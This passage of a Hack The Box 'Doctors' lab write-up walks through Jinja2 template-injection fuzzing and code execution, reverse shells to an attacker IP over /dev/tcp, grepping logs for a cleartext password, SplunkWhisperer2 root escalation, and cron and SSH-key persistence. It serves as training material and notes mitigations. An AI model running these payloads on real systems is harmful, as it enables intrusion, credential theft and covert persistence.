+<p>I try and connect but the page will not load. I also try curling but the connection is continually reset by the host. I am going to restart the host as this in my experience, is not intended behavior from the Splunk Universal Forwarder.</p>
+</li>
+</ul>
+<h4 id="splunk-universal-forwarder-primer">Splunk Universal Forwarder Primer:</h4>
+<ul>
+<li>
+<p>Whilst we wait on the box resetting here is a primer on the Splunk universal forwarder and what it does.</p>
+</li>
+<li>
+<p>Think of the Universal Forwarder as Splunk&rsquo;s specialized data courier - a stripped-down version of Splunk Enterprise that&rsquo;s been optimized getting log data from point A to point B, as quickly as possible.</p>
+</li>
+<li>
+<p>By eliminating non-essential components like the UI and Python interpreter, it achieves remarkable performance with minimal system footprint.</p>
+</li>
+<li>
+<p><strong>Strategic limitations</strong>:</p>
+<ul>
+<li>The UF&rsquo;s limitations are actually strategic design choices. These constraints ensure maximum reliability and minimal attack surface - crucial for security-focused deployments.
+<ol>
+<li>No data parsing capabilities (raw data forwarding only)</li>
+<li>Absence of UI and Python support</li>
+<li>Limited local filtering options</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Security Features</strong>:</p>
+<ul>
+<li>SSL/TLS encryption for data in transit</li>
+<li>Configurable authentication mechanisms</li>
+<li>Queue persistence during network outages</li>
+<li>Robust metadata tagging for forensic integrity</li>
+</ul>
+</li>
+<li>
+<p><strong>The UF shines in several security-critical scenarios</strong>:</p>
+<ul>
+<li>Enterprise-wide endpoint telemetry collection</li>
+<li>Real-time security log aggregation</li>
+<li>Compliance data gathering</li>
+<li>Network traffic monitoring</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-splunk">Enumerating Splunk:</h4>
+<ul>
+<li>
+<p>After the reset I can view the page as expected and it appears it is the Universal Forwarder.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-065016_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I check all links and two are requesting login credentials <code>serviceNS</code> &amp; <code>service</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-065253_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I run some very basic cred stuffing, <code>admin:admin</code>, <code>root:root</code> etc, but none grant access.</p>
+</li>
+<li>
+<p>I know that it is possible to privesc using the universal forwarder as I have read these article&rsquo;s <a href="https://airman604.medium.com/Splunk-universal-forwarder-hijacking-5899c3e0e6b2">Airman&rsquo;s article</a> &amp; <a href="https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/">Clement Notin&rsquo;s article</a> before however credentials are required so let&rsquo;s put a pin in this.</p>
+</li>
+</ul>
+<h3 id="web-80">Web <code>80</code>:</h3>
+<ul>
+<li><strong>Web Enumeration via Burp Suite</strong>:
+<ul>
+<li>When enumerating a website, always use Burp Suite. This allows you to:
+<ul>
+<li>Record all potential injection points.</li>
+<li>Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="initial-enumeration">Initial Enumeration:</h4>
+<ul>
+<li>Browsing to the site we can see it has the domain listed as <code>doctors.htb</code> in an email address.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-133932_.png">
+</figure>
+</li>
+<li>I will add this to my <code>/etc/hosts</code> file for easy scanning</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-doctors-dot-htb">Enumerating doctors.htb</h4>
+<ul>
+<li>After adding doctors.htb to my hosts file I navigate to the page and fine a Secure Messaging Service
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-135212_.png">
+</figure>
+
+<ul>
+<li>I add some test data as to it&rsquo;s response.</li>
+</ul>
+</li>
+<li>I get the response: &ldquo;Nope, no such luck&rdquo;
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-135245_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I create a new account following the signup process:
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-135801_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-archive-in-the-html-of-the-homepage">Finding <code>/archive</code> in the html of the homepage</h4>
+<ul>
+<li>
+<p>Looking at the source code of the <code>/home</code> page once logged in we can see the following <code>hmtl</code> comment.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-170222_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I navigate to <code>/archive</code> however it appears to be a blank page</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-170319_.png">
+</figure>
+</li>
+<li>However if we look at the source-code we can see there is xml content</li>
+</ul>
+</li>
+<li>
+<p>I create a test post</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-170521_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>And when I look back in the archive I can see it&rsquo;s listed as an item.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-170624_.png">
+</figure>
+</li>
+<li>As we can see it&rsquo;s pulling the title through in the title tags. Which means it may be vulnerable to SSTI.</li>
+</ul>
+</li>
+</ul>
+<h4 id="fuzzing-for-ssti-and-discovering-the-template-engine-dot">Fuzzing for SSTI and discovering the template engine.</h4>
+<ul>
+<li>The table below shows what the input and the correct responses should be and then how we should progress.
+<ul>
+<li>There is a handy flow chart that corresponds to this on payload all the things:
+<ul>
+<li><figure><img src="/ox-hugo/serverside.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>Payload</th>
+          <th>Path Taken</th>
+          <th>Template Engine</th>
+          <th>Result</th>
+          <th>Response/Output</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>${7*7}</code></td>
+          <td>Direct Input</td>
+          <td><strong>Smarty</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Mako</strong></td>
+          <td>❓ Unknown</td>
+          <td>Unknown</td>
+      </tr>
+      <tr>
+          <td><code>a{*comment*}b</code></td>
+          <td>Comment Handling Input</td>
+          <td><strong>Smarty</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>ab</code></td>
+      </tr>
+      <tr>
+          <td><code>${&quot;&quot;.join(&quot;ab&quot;)}</code></td>
+          <td>Join Function Injection</td>
+          <td><strong>Smarty</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>ab</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Mako</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>ab</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Jinja2</strong></td>
+          <td>❓ Unknown</td>
+          <td>Unknown</td>
+      </tr>
+      <tr>
+          <td><code>{{7*7}}</code></td>
+          <td>Double Braces Input</td>
+          <td><strong>Jinja2</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Twig</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Unknown</strong></td>
+          <td>❓ Unknown</td>
+          <td>Unknown</td>
+      </tr>
+      <tr>
+          <td><code>{{7*'7'}}</code></td>
+          <td>String Multiplication Attempt</td>
+          <td><strong>Jinja2</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>7777777</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Twig</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li><strong>Same content as a list for fuzzing</strong>:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$%7b7*7%7d%0aa%7b*comment*%7db%0a$%7b%22%22.join%28%22ab%22%29%7d%0a%7b%7b7*7%7d%7d%0a%7b%7b7*%277%27%7d%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>${7*7}
+</span></span><span style="display:flex;"><span>a{*comment*}b
+</span></span><span style="display:flex;"><span>${&#34;&#34;.join(&#34;ab&#34;)}
+</span></span><span style="display:flex;"><span>{{7*7}}
+</span></span><span style="display:flex;"><span>{{7*&#39;7&#39;}}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>I capture a <code>POST</code> request in burp for the creation of a new pose and send to intruder. I then select my injection point and load my payload list.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-173408_.png">
+</figure>
+</li>
+<li>+Note+: You want to ensure that URL encoding is OFF.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-173531_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I then request the archive again and see the following</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-173639_.png">
+</figure>
+</li>
+<li>If we cross-reference that with the image &amp; table I have above we can see that the only payloads that were processed were the final two <code>{{7*7}}</code> &amp; <code>{{7*'7'}}</code> and given their responses, <code>49</code> for payload 1 and <code>7777777</code> for payload 2 we know that this template engine is <code>jinja2</code>.</li>
+</ul>
+</li>
+</ul>
+<h4 id="rce-poc">RCE POC:</h4>
+<ul>
+<li>
+<p>Even though the above does prove RCE I want to verify this further.</p>
+</li>
+<li>
+<p>I create a new post with the following content as if we have RCE the <code>/etc/passwd</code> file is world readable so can confirm.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%7b%7b%20self.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27cat%20/etc/passwd%27%29.read%28%29%20%7d%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat /etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read() }}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-174937_.png">
+</figure>
+</li>
+<li>I save it then navigate to <code>/archive</code> in order for the SSTI template engine to process the payload.</li>
+<li><figure><img src="/ox-hugo/2024-12-20-175222_.png">
+</figure>
+
+<ul>
+<li>We have RCE, let&rsquo;s get a shell.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="getting-a-reverse-shell-via-ssti">Getting a reverse shell via SSTI:</h3>
+<ul>
+<li>I repeat the same process with this payload:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%7b%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7d%7b%25%20if%20%22warning%22%20in%20x.__name__%25%7d%7b%7bx%28%29._module.__builtins__[%27__import__%27]%28%27os%27%29.popen%28%22bash%20-c%20%27bash%20-i%20%3e&amp;%20/dev/tcp/10.10.14.80/9967%200%3e&amp;1%27%22%29.read%28%29%7d%7d%7b%25endif%25%7d%7b%25endfor%25%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__<span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.80/9967 0&gt;&amp;1&#39;&#34;</span>)<span style="color:#f92672">.</span>read()}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-12-20-180031_.png">
+</figure>
+
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-12-20-180116_.png">
+</figure>
+
+</li>
+<li>
+<p><strong>Reverse shell caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-180136_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="exploit-reverse-shell-breakdown">Exploit/Reverse Shell Breakdown:</h4>
+<p>The payload:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%7b%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7d%0a%20%20%20%20%7b%25%20if%20%22warning%22%20in%20x.__name__%20%25%7d%0a%20%20%20%20%20%20%20%20%7b%7bx%28%29._module.__builtins__[%27__import__%27]%28%27os%27%29.popen%28%22bash%20-c%20%27bash%20-i%20%3e&amp;%20/dev/tcp/10.10.14.80/9967%200%3e&amp;1%27%22%29.read%28%29%7d%7d%0a%20%20%20%20%7b%25%20endif%20%25%7d%0a%7b%25%20endfor%20%25%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.80/9967 0&gt;&amp;1&#39;&#34;</span>)<span style="color:#f92672">.</span>read()}}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}</span></span></code></pre></div>
+    
+</div>
+<p><strong>Step-by-step Analysis</strong></p>
+<ol>
+<li>
+<p><strong>Traversal of Python Classes</strong>:</p>
+<ul>
+<li><code>().__class__</code> retrieves the class of an empty tuple (e.g., <code>&lt;class 'tuple'&gt;</code>).</li>
+<li><code>().__class__.__base__</code> accesses the base class of <code>tuple</code>, which is <code>&lt;class 'object'&gt;</code>.</li>
+<li><code>().__class__.__base__.__subclasses__()</code> enumerates all subclasses of the base <code>object</code> class.
+<ul>
+<li><strong>Purpose</strong>: This enables us to traverse the entire Python object hierarchy, including security-sensitive classes.</li>
+</ul>
+</li>
+<li><strong>Why</strong>:
+<ul>
+<li>This traversal is necessary to gain access to internal classes that may expose sensitive or powerful functionality.</li>
+<li>The goal is to locate a class that allows interaction with Python&rsquo;s built-in capabilities, particularly those capable of importing modules or executing commands.</li>
+<li>Without this enumeration, we wouldn&rsquo;t be able to dynamically discover and exploit useful subclasses like <code>warnings.WarningMessage</code>.</li>
+</ul>
+</li>
+<li><strong>Simple Terms</strong>: It’s like looking through a list of all possible tools in Python to find one that can break the system.</li>
+</ul>
+</li>
+<li>
+<p><strong>Finding a Specific Subclass</strong>:</p>
+<ul>
+<li><code>for x in ().__class__.__base__.__subclasses__()</code>: Iterates through all subclasses of <code>object</code>.</li>
+<li><code>if &quot;warning&quot; in x.__name__</code>: Filters for a subclass where <code>&quot;warning&quot;</code> exists in the class name.
+<ul>
+<li>Example match: <code>&lt;class 'warnings.WarningMessage'&gt;</code>.</li>
+</ul>
+</li>
+<li><strong>Why</strong>:
+<ul>
+<li>Not all subclasses are useful for exploitation. The filter specifically targets classes that are likely to provide the <code>_module</code> attribute or similar access to the <code>__builtins__</code> dictionary.</li>
+<li><code>warnings.WarningMessage</code> is chosen because it provides a pathway to Python’s built-in functions through its <code>_module</code> attribute.</li>
+<li>We use this class as a pivot to access the dangerous <code>__builtins__['__import__']</code> method, which allows importing any module dynamically.</li>
+<li><strong>Simple Terms</strong>: It’s like picking a specific tool from the list (a warning-related tool) because it opens the door to other powerful tools hidden inside Python.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Accessing Built-in Functions</strong>:</p>
+<ul>
+<li><code>x()._module</code>: Accesses the module of the identified subclass.</li>
+<li><code>.__builtins__</code>: Retrieves the built-in functions of the module.</li>
+<li><code>['__import__']('os')</code>: Dynamically imports the <code>os</code> module.</li>
+</ul>
+</li>
+<li>
+<p><strong>Executing the Reverse Shell Command</strong>:</p>
+<ul>
+<li><code>os.popen(&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/9967 0&gt;&amp;1'&quot;).read()</code>: Opens a subprocess to execute a reverse shell command.</li>
+<li><strong>Effect</strong>: The server connects to our machine (10.10.14.80) on port 9967, granting remote access.</li>
+</ul>
+</li>
+</ol>
+<h4 id="exploitation-mitigation-techniques">Exploitation Mitigation Techniques:</h4>
+<ul>
+<li><strong>Input Validation</strong>: Ensure user inputs are sanitized before being passed to the template.</li>
+<li><strong>Use Sandboxed Template Engines</strong>: Configure Jinja2 with a sandbox to limit its capabilities.</li>
+<li><strong>Disable Dangerous Features</strong>: Restrict access to functions like <code>__builtins__</code> or <code>os</code> that can execute arbitrary commands.</li>
+</ul>
+<h3 id="discovering-our-user-is-part-of-the-adm-group">Discovering Our User is part of the adm group:</h3>
+<ul>
+<li>
+<p>Looking through the host there is a user called shaun, however we cannot read anything in his home directory, however we can list the contents.</p>
+</li>
+<li>
+<p>I check our group membership and can see our user is part of the <code>adm</code> group.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-182518_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>adm primer</strong>:</p>
+<ul>
+<li>Members of the <code>adm</code> group are able to read all logs stored in <code>/var/log</code>. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
+<ul>
+<li><strong>We can run to search for creds</strong>:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="find%20/var/log%20-type%20f%20-exec%20grep%20%22password%22%20%7b%7d%20&#43;%0afind%20/var/log%20-type%20f%20-exec%20grep%20%22username%22%20%7b%7d%20&#43;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find /var/log -type f -exec grep <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">{}</span> +
+</span></span><span style="display:flex;"><span>find /var/log -type f -exec grep <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">{}</span> +</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-clear-text-password-in-var-log-apache2-logs">Finding a clear text password in <code>/var/log/apache2</code> logs</h3>
+<ul>
+<li>
+<p>I run <code>find /var/log -type f -exec grep &quot;password&quot; {} +</code> &amp; discover a clear text password.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-183016_.png">
+</figure>
+
+<ul>
+<li><code>Guitar123</code></li>
+<li>+Note+: Even though it appears to be being passed as an argument to the <code>email</code> parameter it&rsquo;s not an email so we can surmise it&rsquo;s a password entered incorrectly in the email field.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I check if it&rsquo;s valid for &ldquo;Shaun&rdquo; &amp; can login as him</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-183141_.png">
+</figure>
+</li>
+<li>+Note+: I check if it&rsquo;s valid for ssh but it&rsquo;s not.</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-shaun">Enumerating as shaun:</h3>
+<ul>
+<li>
+<p>Let&rsquo;s grab our user flag.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-183311_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I do some further enumeration but nothing is found on the host that I can see.</p>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="logging-into-splunk-universal-forwarder-as-shaun">Logging into splunk Universal Forwarder as shaun:</h3>
+<ul>
+<li>
+<p>I re-open the splunk universal forwarder page and try shauns creds &amp; they work. This time I provided with alot more options.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-071139_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Now we can enumerate this, however I know for a fact that with creds we can privesc using <a href="https://github.com/cnotin/SplunkWhisperer2">SplunkWhisperer2</a>.</p>
+</li>
+</ul>
+<h3 id="getting-root-using-splunkwhisperer2-to-exploit-the-universal-forwarder">Getting root using SplunkWhisperer2 to exploit the Universal Forwarder:</h3>
+<ul>
+<li>
+<p><strong>Quick POC to verify RCE</strong>:</p>
+<ul>
+<li>I stand up a quick python web-server and have SplunkWhisperer curl it to verify that we can infact run commands on the host &amp; we can.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-071902_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Getting our reverse root shell</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="python3%20PySplunkWhisperer2_remote.py%20--host%20$box%20--lhost%2010.10.14.80%20--username%20$user%20--password%20$pass%20--payload%20%22bash%20-c%20%27bash%20-i%20%3e&amp;%20/dev/tcp/10.10.14.80/9967%200%3e&amp;1%27%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 PySplunkWhisperer2_remote.py --host $box --lhost 10.10.14.80 --username $user --password $pass --payload <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.80/9967 0&gt;&amp;1&#39;&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-12-21-073555_.png">
+</figure>
+
+</li>
+<li>
+<p><strong>Lets get the root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-073801_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-persistence">4. Persistence:</h2>
+<ul>
+<li>As a means to ensure persistence on this machine I will create and add an SSH key as we know that service is running. I will also add a cronjob that calls back out to my attack machine at a set interval.</li>
+</ul>
+<h3 id="persistence-method-1-creating-a-cron-job-reverse-shell">Persistence Method 1: Creating a cron job reverse shell:</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%28crontab%20-l%20%3e%20.tab%20;%20echo%20%22*%20*%20*%20*%20*%20/bin/bash%20-c%20%27/bin/bash%20-i%20%3e&amp;%20/dev/tcp/10.10.14.80/80%200%3e&amp;1%27%22%20%3e%3e%20.tab%20;%20crontab%20.tab%20;%20rm%20.tab%29%20%3e%20/dev/null%202%3e&amp;1">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>crontab -l &gt; .tab ; echo <span style="color:#e6db74">&#34;* * * * * /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.80/80 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; .tab ; crontab .tab ; rm .tab<span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-12-21-075648_.png">
+</figure>
+
+</li>
+<li>
+<p>Let&rsquo;s verify it&rsquo;s in the crontab by running <code>crontab -l</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-075743_.png">
+</figure>
+</li>
+<li>As we can see it&rsquo;s running.</li>
+</ul>
+</li>
+<li>
+<p>I start my listener and get a connection back after 1 minute.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-075844_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>+Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.</p>
+</li>
+</ul>
+<h3 id="persistence-method-2-adding-an-ssh-key">Persistence Method 2: Adding an SSH key:</h3>
+<ul>
+<li>So typically what we could do is make a new user, however I am going to generate a key for the root user we already have access too.</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>Generate SSH Key for the User</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="ssh-keygen%20-t%20rsa%20-b%204096">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh-keygen -t rsa -b <span style="color:#ae81ff">4096</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-080723_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Copy Public Key to Authorized Keys</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cp%20~/.ssh/id_rsa.pub%20~/.ssh/authorized_keys">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user.</li>
+<li><figure><img src="/ox-hugo/2024-12-21-080801_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Copy Private key to attack machine</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cat%20id_rsa">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat id_rsa</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-080902_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Change the mode of the key so the permissions are not too open</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20chmod%20400%20id_rsa">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">400</span> id_rsa</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Verify it works</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
